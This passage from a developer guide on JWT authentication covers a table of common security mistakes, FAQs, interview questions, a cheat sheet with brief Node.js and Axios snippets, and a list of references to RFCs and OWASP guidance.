| 17 | Forgetting `Secure` flag on cookies | Sent over HTTP | `Secure: true` |
| 18 | No `SameSite` on cookies | CSRF | `SameSite=Strict` |
| 19 | No rate limiting | Brute force | Rate-limit auth endpoints |
| 20 | Using HS256 in multi-service | Secret leaks everywhere | Use RS256/ES256 |
| 21 | Using RSA without `kid` | Can't rotate keys | Add `kid` header |
| 22 | No clock skew tolerance | False rejections | Allow ~30 seconds |
| 23 | JWT for session when DB session works | Over-engineering | Use the right tool |
| 24 | Not revoking compromised tokens | Long-lived exposure | Add blocklist or rotation |
| 25 | Storing tokens in cookies without `HttpOnly` | XSS exfiltration | `HttpOnly: true` |
| 26 | Implementing JWT yourself | Bugs | Use a vetted library |
| 27 | Using `bcrypt` with cost <12 | Fast brute force | bcrypt cost ≥12 or Argon2id |
| 28 | Forgetting to invalidate refresh tokens on password change | Stolen tokens still work | Revoke all on password change |
| 29 | No monitoring of auth events | Can't detect attacks | Log + alert |
| 30 | Treating JWT as encrypted | PII leaks | Use JWE or server-side storage |

**Key Takeaways**

* Most JWT bugs are about handling, not the token itself.
* Always specify algorithms in verify.
* Use HttpOnly cookies and short lifetimes.

---

# Frequently Asked Questions
> 50+ FAQs covering JWT fundamentals, implementation, security, and architecture.

1. What does JWT stand for?
JSON Web Token.

2. Is JWT encrypted?
No. By default it's signed and Base64URL-encoded. Use JWE for encryption.

3. Can anyone read JWT payload?
Yes — just Base64URL-decode it.

4. What's the difference between JWT and OAuth?
JWT is a token format. OAuth 2.0 is an authorization framework that often uses JWT.

5. What's the difference between JWT and OIDC?
OIDC is an identity layer on top of OAuth 2.0. It uses JWT for ID tokens.

6. What is alg: "none"?
A historical option that disabled signature verification. Modern libraries reject it.

7. Should I use HS256 or RS256?
HS256 for single-trust systems; RS256 for multi-service.

8. What is kid in the header?
Key ID — used to identify which key to use for verification (for rotation).

9. Can I revoke a JWT?
Not directly (stateless), but you can use a blocklist or short expiration.

10. What is the jti claim?
JWT ID — a unique identifier for the token, used for revocation and reuse detection.

11. Where should I store JWT in the browser?
HttpOnly cookies (best) or memory (acceptable for SPAs with silent refresh).

12. What is CSRF?
Cross-Site Request Forgery — attacker makes the browser send requests to your API.

13. What is XSS?
Cross-Site Scripting — attacker injects JS into your page.

14. Should I put user roles in JWT?
Yes, but always re-verify server-side. Roles in JWT are a hint, not authorization.

15. How long should access tokens live?
5–15 minutes for most apps. Shorter is safer.

16. How long should refresh tokens live?
7–30 days. With rotation, longer is acceptable.

17. What is token rotation?
Issuing a new refresh token every time the old one is used.

18. What is reuse detection?
Detecting when an already-used refresh token is used again — indicates theft.

19. Can two services share the same JWT secret?
Yes for HS256 (symmetric). For RS256, only the issuer needs the private key.

20. What is Base64URL?
A URL-safe variant of Base64 that replaces + with -, / with _, and removes padding.

21. What is the difference between JWT and a session cookie?
Sessions are server-side state with a session ID. JWT is stateless and self-contained.

22. Can JWT work across domains?
Yes, if CORS is configured properly and credentials are allowed.

23. What's the size limit for JWT?
There's no fixed limit, but keep it under a few KB. Cookies have a 4KB limit.

24. Should I use JWT for CSRF protection?
No. Use SameSite cookies and/or CSRF tokens.

25. What's a JWE?
JSON Web Encryption — encrypted JWT, used when payload must be confidential.

26. Can I use JWT for password reset links?
Yes, with single-use semantics and short expiration. Store jti to prevent reuse.

27. Should I blacklist JWTs?
Only for compromised tokens. Use a Redis blocklist with TTL.

28. What is clock skew?
Difference between server clocks. JWT libraries allow a tolerance (e.g., 30s).

29. What is the JOSE family?
JSON Object Signing and Encryption — JWS, JWE, JWK, JWA, JWT.

30. What happens if my JWT secret leaks?
Rotate immediately, invalidate all tokens, force users to re-login.

31. Can I have multiple audiences?
Yes. aud can be a string or array.

32. What's the difference between sub and jti?
sub identifies the user; jti identifies the specific token.

33. How do I test JWT?
Use jwt.io, library test helpers, and unit tests.

34. What is nbf?
Not Before — token is invalid before this time.

35. What's the best JWT library for Node.js?
jsonwebtoken is the de-facto standard. jose is more modern.

36. What is the best JWT library for Python?
PyJWT for simple cases; python-jose for full JOSE.

37. What is the best JWT library for Java?
Nimbus JOSE+JWT or jjwt.

38. What is the best JWT library for Go?
golang-jwt/jwt.

39. What is the best JWT library for Ruby?
jwt gem.

40. What is the best JWT library for PHP?
firebase/php-jwt or lcobucci/jwt.

41. Can JWT be used for SSO?
Yes — that's exactly what OIDC's ID token is.

42. Can JWT be used for API authentication?
Yes — that's the most common use.

43. Can JWT be used for service-to-service auth?
Yes — a service can sign tokens for another to verify.

44. What's the most secure JWT setup?
RS256/ES256, short access tokens, rotated refresh tokens, HttpOnly cookies, strong secrets, explicit algorithm validation.

45. Should I sign cookies with JWT?
You can, but session cookies or signed cookies (via frameworks) are usually simpler.

46. Can JWT include binary data?
Not directly. Encode binary as Base64 inside claims.

47. What if I lose my JWT secret?
You lose the ability to verify existing tokens. Rotate and force re-login.

48. How do I migrate from sessions to JWT?
Run both in parallel, migrate users gradually, then deprecate sessions.

49. What's the difference between access token and ID token?
Access token authorizes API access. ID token proves identity to the client app.

50. Can I put a JWT inside another JWT?
Yes — nested JWTs are allowed but rarely needed.

51. Should JWT be logged?
Never log the full token. Log only metadata (user ID, expiration).

52. What's the difference between Authorization: Bearer and Authorization: Basic?
Bearer means "here's a token." Basic means "here are base64-encoded credentials."

53. Can I use JWT for file downloads?
Use signed URLs (e.g., S3 pre-signed URLs) instead.

54. How do I handle JWT in WebSockets?
Send as a query param on connect, then verify; or use a short-lived ticket exchange.

55. What is asymmetric key wrapping?
Encrypting a JWT session key with the recipient's public key — used in JWE.

---

# Interview Questions
> 50 interview questions with concise answers.

1. What is JWT?
A compact, URL-safe, signed token format defined by RFC 7519 for transmitting claims between parties.

2. What are the three parts of a JWT?
Header, payload, signature.

3. How is a JWT signed?
The header and payload are concatenated and signed with HMAC (HS256) or an asymmetric algorithm (RS256, ES256, EdDSA).

4. What is the difference between signed and encrypted JWT?
Signed (JWS) ensures integrity. Encrypted (JWE) ensures confidentiality.

5. What is Base64URL?
A URL-safe variant of Base64 that replaces + and / and removes = padding.

6. What are standard claims?
iss, sub, aud, exp, iat, nbf, jti.

7. What is the aud claim?
Audience — the intended recipient(s) of the token.

8. What is the difference between authentication and authorization?
AuthN verifies identity; AuthZ verifies permissions.

9. What is algorithm confusion?
An attack where the attacker changes alg in the header to a weaker algorithm to bypass verification.

10. How do you prevent algorithm confusion?
Always specify the allowed algorithms explicitly when verifying.

11. What is HS256?
HMAC with SHA-256, a symmetric signing algorithm.

12. What is RS256?
RSA Signature with SHA-256, an asymmetric algorithm.

13. When should you use RS256 over HS256?
When multiple services need to verify tokens but only one should issue them.

14. What is a refresh token?
A long-lived credential used to obtain new access tokens.

15. What is token rotation?
Issuing a new refresh token on every use, invalidating the old one.

16. What is reuse detection?
Detecting when an already-used refresh token is presented, indicating theft.

17. Where should you store JWTs on the client?
HttpOnly cookies (preferred) or memory (acceptable for SPAs).

18. Why is localStorage a bad place for JWTs?
Any XSS can exfiltrate the token.

19. What is CSRF?
Cross-Site Request Forgery — making the victim's browser send unwanted requests.

20. How do you prevent CSRF?
SameSite=Strict cookies, CSRF tokens, double-submit cookies.

21. What is XSS?
Cross-Site Scripting — injecting JS into a page.

22. How do you prevent XSS?
Sanitize input, use a strict CSP, escape output, store tokens in HttpOnly cookies.

23. What is clockTolerance?
A small leeway (e.g., 30 seconds) for clock differences when validating exp and nbf.

24. What is the jti claim?
JWT ID — a unique identifier used for revocation and reuse detection.

25. What is iss?
Issuer — the entity that issued the token.

26. What is nbf?
Not Before — the token is invalid before this time.

27. What is exp?
Expiration Time — when the token becomes invalid.

28. What is the difference between access token and ID token?
Access tokens authorize API access; ID tokens prove identity to the client.

29. What is OAuth 2.0?
An authorization framework that often uses JWTs as access tokens.

30. What is OpenID Connect?
An identity layer on top of OAuth 2.0 that uses JWT ID tokens.

31. What is JWE?
JSON Web Encryption — encrypted JWT for confidential payloads.

32. What is JWS?
JSON Web Signature — signed JWT.

33. What is the JOSE family?
JWS, JWE, JWK, JWA, JWT — the standards that govern JSON-based security tokens.

34. What is a kid header?
Key ID — identifies which key to use for verification.

35. How do you rotate JWT secrets?
Support both old and new keys for a grace period; sign new tokens with the new key.

36. What is the recommended lifetime for access tokens?
5–15 minutes.

37. What is the recommended lifetime for refresh tokens?
7–30 days, with rotation.

38. What is a session token?
A server-side credential that references stored session state.

39. When should you NOT use JWT?
For monolithic apps where server-side sessions are simpler and easier to revoke.

40. What is RBAC?
Role-Based Access Control — authorization based on user roles.

41. What are scopes?
Granular permissions included in a token (e.g., read:users).

42. What is the best way to hash passwords?
Argon2id, with bcrypt cost ≥12 as a fallback.

43. What is the OWASP recommendation for JWT?
Validate algorithm explicitly, use strong secrets, use short lifetimes, use HTTPS, store safely.

44. What is iat?
Issued At — when the token was created.

45. What is sub?
Subject — the user/entity the token represents.

46. What is the difference between nbf and iat?
iat records when the token was issued; nbf is when it becomes valid.

47. Can a JWT be revoked?
Not directly. Use a blocklist, short expiration, or refresh token revocation.

48. What is a JWT blocklist?
A server-side list of revoked jtis, often stored in Redis with TTL = remaining lifetime.

49. What is silent refresh?
Calling the refresh endpoint on app load to restore the session without user interaction.

50. What is the difference between a stateless and stateful session?
Stateless = JWT (no server-side session). Stateful = session ID + server-side store.

51. What is the most common JWT vulnerability?
Improper storage (e.g., localStorage) and algorithm confusion.

52. How do you test JWT-based auth?
Unit tests for token generation/verification, integration tests for flows, jwt.io for debugging.

---

# Cheat Sheet
> A one-page reference for daily use.

**Structure**
```text
HEADER.PAYLOAD.SIGNATURE   (Base64URL, signed)
```
**Standard Claims**
```text
iss   issuer
sub   subject (user id)
aud   audience
exp   expiration (unix seconds)
iat   issued at
nbf   not before
jti   unique token id
```
**Algorithms**
```text
HS256  HMAC-SHA256        symmetric, single service
RS256  RSA-SHA256         asymmetric, multi-service
ES256  ECDSA P-256        asymmetric, modern
EdDSA  Ed25519            asymmetric, fastest
```
**Backend Snippet (Node.js)**
```typescript
jwt.sign(payload, secret, { algorithm: 'HS256', expiresIn: '15m' });
jwt.verify(token, secret, { algorithms: ['HS256'] });
```
**Frontend Snippet (Axios)**
```typescript
axios.create({ withCredentials: true });
api.interceptors.response.use(handle401);
```
**Storage**
```text
Access token   → HttpOnly cookie OR memory
Refresh token  → HttpOnly + Secure + SameSite=Strict cookie
localStorage   → ❌ never
```
**Best Practices**
```text
✓ HTTPS
✓ Short access tokens (5–15m)
✓ Rotate refresh tokens
✓ Detect reuse
✓ Validate iss/aud/exp
✓ Strong secrets (≥256 bits)
✓ Argon2id for passwords
✓ Rate limit /auth/*
✓ Log auth events
✓ Rotate secrets
```

---

# 📚 Resources

## 📖 Official Standards (RFCs)

- 📄 **RFC 7519** — JSON Web Token (JWT)
- 📄 **RFC 7515** — JSON Web Signature (JWS)
- 📄 **RFC 7516** — JSON Web Encryption (JWE)
- 📄 **RFC 7517** — JSON Web Key (JWK)
- 📄 **RFC 7518** — JSON Web Algorithms (JWA)

---

## 🔒 Security Guidance

- 🛡️ OWASP JWT Cheat Sheet
- 🛡️ OWASP API Security Top 10
- 🛡️ Auth0 JWT Best Practices

---

## 🛠️ Developer Tools

- 🔑 jwt.io — JWT Debugger
- 🌐 MDN — Using Fetch API
- 🍪 MDN — HTTP Cookies

---

## 📚 Library Documentation

- 🟢 Node.js `jsonwebtoken`
- 🚀 Express Documentation
- 🗄️ Prisma Documentation
- 🔐 `jose` — Modern JOSE Library

---

## 📘 Further Reading

- 🔐 OAuth 2.0 (RFC 6749)
- 👤 OpenID Connect Core 1.0
- 🏛️ NIST SP 800-63B — Digital Identity Guidelines